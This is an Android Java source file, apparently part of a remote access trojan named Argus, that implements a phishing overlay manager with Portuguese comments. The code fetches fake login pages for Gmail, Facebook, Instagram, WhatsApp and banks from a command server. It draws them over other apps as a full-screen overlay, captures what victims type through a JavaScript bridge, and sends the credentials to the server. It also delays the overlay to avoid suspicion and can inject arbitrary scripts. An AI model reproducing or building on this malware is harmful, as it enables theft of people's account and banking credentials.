package com.argus.rat;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONObject;

import java.io.IOException;

import okhttp3.*;

/**
 * PhishingWebViewManager - Sistema avançado de phishing com WebView
 * Integrado com templates do servidor
 * Sistema Argus - Nível Militar
 */
public class PhishingWebViewManager {
    private static final String TAG = "PhishingWebView";
    
    private Context context;
    private String serverUrl = "http://192.168.1.100:5000";  // Configurável
    private String deviceId;
    
    private WebView phishingWebView;
    private WindowManager windowManager;
    private WindowManager.LayoutParams layoutParams;
    
    private OkHttpClient httpClient;
    private Handler mainHandler;
    
    // Singleton
    private static PhishingWebViewManager instance;
    
    private PhishingWebViewManager(Context context) {
        this.context = context.getApplicationContext();
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.deviceId = getDeviceId();
        
        // Cliente HTTP para comunicação
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build();
        
        Log.i(TAG, "PhishingWebViewManager inicializado");
    }
    
    public static synchronized PhishingWebViewManager getInstance(Context context) {
        if (instance == null) {
            instance = new PhishingWebViewManager(context);
        }
        return instance;
    }
    
    /**
     * Exibe página de phishing para plataforma específica
     * 
     * @param platform gmail, facebook, instagram, whatsapp, banco
     */
    public void showPhishingPage(String platform) {
        mainHandler.post(() -> {
            try {
                // Criar WebView se não existe
                if (phishingWebView == null) {
                    createPhishingWebView();
                }
                
                // Carregar template do servidor
                String templateUrl = serverUrl + "/api/phishing/templates/" + platform;
                
                Log.i(TAG, "Carregando template de phishing: " + platform);
                phishingWebView.loadUrl(templateUrl);
                
                // Adicionar à janela
                if (windowManager != null && phishingWebView.getParent() == null) {
                    windowManager.addView(phishingWebView, layoutParams);
                    Log.i(TAG, "WebView de phishing exibida");
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao exibir página de phishing", e);
            }
        });
    }
    
    /**
     * Cria WebView furtiva para phishing
     */
    @SuppressLint({"SetJavaScriptEnabled", "JavascriptInterface"})
    private void createPhishingWebView() {
        mainHandler.post(() -> {
            try {
                // Criar WebView
                phishingWebView = new WebView(context);
                
                // Configurar WebView
                WebSettings settings = phishingWebView.getSettings();
                settings.setJavaScriptEnabled(true);
                settings.setDomStorageEnabled(true);
                settings.setDatabaseEnabled(true);
                settings.setAllowFileAccess(false);
//                settings.setAllowUniversalAccessFromFileUrls(false);
                
                // User Agent legítimo
                settings.setUserAgentString(
                    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
                );
                
                // Adicionar interface JavaScript
                phishingWebView.addJavascriptInterface(new PhishingJsInterface(), "Android");
                
                // WebViewClient customizado
                phishingWebView.setWebViewClient(new WebViewClient() {
                    @Override
                    public boolean shouldOverrideUrlLoading(WebView view, String url) {
                        // Permitir navegação dentro do WebView
                        return false;
                    }
                    
                    @Override
                    public void onPageFinished(WebView view, String url) {
                        Log.i(TAG, "Página carregada: " + url);
                    }
                });
                
                // Configurar parâmetros da janela
                setupWindowParameters();
                
                Log.i(TAG, "WebView de phishing criada");
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao criar WebView de phishing", e);
            }
        });
    }
    
    /**
     * Configura parâmetros da janela para exibir WebView
     */
    private void setupWindowParameters() {
        windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        
        layoutParams = new WindowManager.LayoutParams();
        
        // Tipo de janela (overlay sobre tudo)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            layoutParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        }
        
        // Flags para comportamento furtivo
        layoutParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
        
        // Formato de pixel
        layoutParams.format = PixelFormat.TRANSLUCENT;
        
        // Posição e tamanho
        layoutParams.gravity = Gravity.CENTER;
        layoutParams.width = WindowManager.LayoutParams.MATCH_PARENT;
        layoutParams.height = WindowManager.LayoutParams.MATCH_PARENT;
        
        layoutParams.x = 0;
        layoutParams.y = 0;
    }
    
    /**
     * Interface JavaScript para comunicação com templates HTML
     */
    private class PhishingJsInterface {
        
        @JavascriptInterface
        public String getDeviceId() {
            return deviceId;
        }
        
        @JavascriptInterface
        public void captureCredentials(String jsonData) {
            try {
                Log.i(TAG, "Credenciais capturadas via JavaScript");
                
                // Enviar credenciais para servidor
                sendCredentialsToServer(jsonData);
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao capturar credenciais", e);
            }
        }
        
        @JavascriptInterface
        public void log(String message) {
            Log.d(TAG, "[JS] " + message);
        }
        
        @JavascriptInterface
        public void closePhishing() {
            hidePhishingPage();
        }
    }
    
    /**
     * Envia credenciais capturadas para o servidor
     */
    private void sendCredentialsToServer(String jsonData) {
        new Thread(() -> {
            try {
                String url = serverUrl + "/api/phishing/capture";
                
                RequestBody body = RequestBody.create(
                    jsonData,
                    MediaType.parse("application/json; charset=utf-8")
                );
                
                Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .header("X-Device-ID", deviceId)
                        .build();
                
                Response response = httpClient.newCall(request).execute();
                
                if (response.isSuccessful()) {
                    Log.i(TAG, "Credenciais enviadas com sucesso ao servidor");
                } else {
                    Log.w(TAG, "Falha ao enviar credenciais: " + response.code());
                }
                
                response.close();
                
            } catch (IOException e) {
                Log.e(TAG, "Erro ao enviar credenciais", e);
            }
        }).start();
    }
    
    /**
     * Oculta página de phishing
     */
    public void hidePhishingPage() {
        mainHandler.post(() -> {
            try {
                if (windowManager != null && phishingWebView != null && phishingWebView.getParent() != null) {
                    windowManager.removeView(phishingWebView);
                    Log.i(TAG, "WebView de phishing ocultada");
                }
            } catch (Exception e) {
                Log.e(TAG, "Erro ao ocultar página de phishing", e);
            }
        });
    }
    
    /**
     * Destrói WebView de phishing
     */
    public void destroy() {
        mainHandler.post(() -> {
            try {
                hidePhishingPage();
                
                if (phishingWebView != null) {
                    phishingWebView.destroy();
                    phishingWebView = null;
                }
                
                Log.i(TAG, "WebView de phishing destruída");
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao destruir WebView", e);
            }
        });
    }
    
    /**
     * Exibe phishing com delay (para não ser suspeitoso)
     */
    public void showPhishingWithDelay(String platform, int delaySeconds) {
        new Handler().postDelayed(() -> {
            showPhishingPage(platform);
        }, delaySeconds * 1000);
    }
    
    /**
     * Exibe phishing baseado em condições
     * Ex: quando app específico é aberto
     */
    public void showConditionalPhishing(String targetApp, String platform) {
        // TODO: Monitorar app em foreground
        // Se targetApp estiver aberto, exibir phishing
        Log.i(TAG, "Phishing condicional configurado: " + targetApp + " -> " + platform);
    }
    
    /**
     * Configura URL do servidor
     */
    public void setServerUrl(String url) {
        this.serverUrl = url;
        Log.i(TAG, "URL do servidor configurada: " + url);
    }
    
    /**
     * Obtém Device ID
     */
    private String getDeviceId() {
        return android.provider.Settings.Secure.getString(
                context.getContentResolver(),
                android.provider.Settings.Secure.ANDROID_ID
        );
    }
    
    /**
     * Verifica se phishing está visível
     */
    public boolean isPhishingVisible() {
        return phishingWebView != null && phishingWebView.getParent() != null;
    }
    
    /**
     * Atualiza conteúdo da página (inject JS)
     */
    public void injectJavaScript(String js) {
        if (phishingWebView != null) {
            mainHandler.post(() -> {
                phishingWebView.evaluateJavascript(js, null);
            });
        }
    }
}

